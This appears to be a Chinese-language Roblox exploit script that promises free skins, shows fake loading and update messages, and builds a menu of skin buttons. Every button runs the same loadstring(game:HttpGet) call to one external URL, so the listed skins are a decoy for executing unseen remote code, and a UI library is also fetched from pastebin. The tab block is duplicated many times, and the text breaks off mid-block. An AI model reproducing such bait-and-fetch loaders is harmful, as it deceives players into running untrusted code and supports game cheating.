local msg = Instance.new("Message",workspace)
msg.Text = "欢迎使用马牛逼脚本"
wait(2.5)
msg:Destroy()
local msg = Instance.new("Message",workspace)
msg.Text = "马牛逼脚本作者：马牛逼"
wait(1.8)
msg:Destroy()
local msg = Instance.new("Message",workspace)
msg.Text = "发现新版本请点击《更新》"
wait(1.8)
msg:Destroy()
local msg = Instance.new("Message",workspace)
msg.Text = "《更新》"
wait(1.2)
local msg = Instance.new("Message",workspace)
msg.Text = "加载中10%"
wait(1.0)
local msg = Instance.new("Message",workspace)
msg.Text = "加载中30%"
wait(1.0)
local msg = Instance.new("Message",workspace)
msg.Text = "加载中50%"
wait(1.0)
local msg = Instance.new("Message",workspace)
msg.Text = "加载中80%"
wait(1.0)
local msg = Instance.new("Message",workspace)
msg.Text = "加载中99%"
wait(5.0)
local msg = Instance.new("Message",workspace)
msg.Text = "加载完毕"
wait(1.0)
local msg = Instance.new("Message",workspace)
msg.Text = "请您愉快的玩耍吧"
wait(1.0)
msg:Destroy()

local OrionLib = loadstring(game:HttpGet("https://pastebin.com/raw/FUEx0f3G"))()
local LBLG = Instance.new("ScreenGui", getParent)
local LBL = Instance.new("TextLabel", getParent)
local player = game.Players.LocalPlayer

LBLG.Name = "LBLG"
LBLG.Parent = game.CoreGui
LBLG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
LBLG.Enabled = true
LBL.Name = "LBL"
LBL.Parent = LBLG
LBL.BackgroundColor3 = Color3.new(1, 1, 1)
LBL.BackgroundTransparency = 1
LBL.BorderColor3 = Color3.new(0, 0, 0)
LBL.Position = UDim2.new(0.75,0,0.010,0)
LBL.Size = UDim2.new(0, 133, 0, 30)
LBL.Font = Enum.Font.GothamSemibold
LBL.Text = "TextLabel"
LBL.TextColor3 = Color3.new(1, 1, 1)
LBL.TextScaled = true
LBL.TextSize = 14
LBL.TextWrapped = true
LBL.Visible = true

local FpsLabel = LBL
local Heartbeat = game:GetService("RunService").Heartbeat
local LastIteration, Start
local FrameUpdateTable = {}

local function HeartbeatUpdate()
	LastIteration = tick()
	for Index = #FrameUpdateTable, 1, -1 do
		FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
	end
	FrameUpdateTable[1] = LastIteration
	local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
	CurrentFPS = CurrentFPS - CurrentFPS % 1
	FpsLabel.Text = ("马牛逼时间"..os.date("%H").."时"..os.date("%M").."分"..os.date("%S").."秒")
end
Start = tick()
Heartbeat:Connect(HeartbeatUpdate)
local Window = OrionLib:MakeWindow({Name = "马牛逼脚本", HidePremium = false, SaveConfig = true,IntroText = "欢迎使用马牛逼脚本（可以免费领皮肤）", ConfigFolder = "作者：马牛逼"})
game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "马牛逼脚本"; Text ="欢迎使用马牛逼脚本"; Duration = 4; })
game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "马牛逼脚本"; Text ="马牛逼脚本作者：马牛逼"; Duration = 4; })
game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "马牛逼脚本"; Text ="玩脚本就玩马牛逼脚本"; Duration = 4; })
local Tab = Window:MakeTab({
    Name = "用户信息",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

Tab:AddParagraph("用户名:"," "..game.Players.LocalPlayer.Name.."")
Tab:AddParagraph("你的注入器:"," "..identifyexecutor().."")
Tab:AddParagraph("服务器的ID"," "..game.GameId.."")

local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
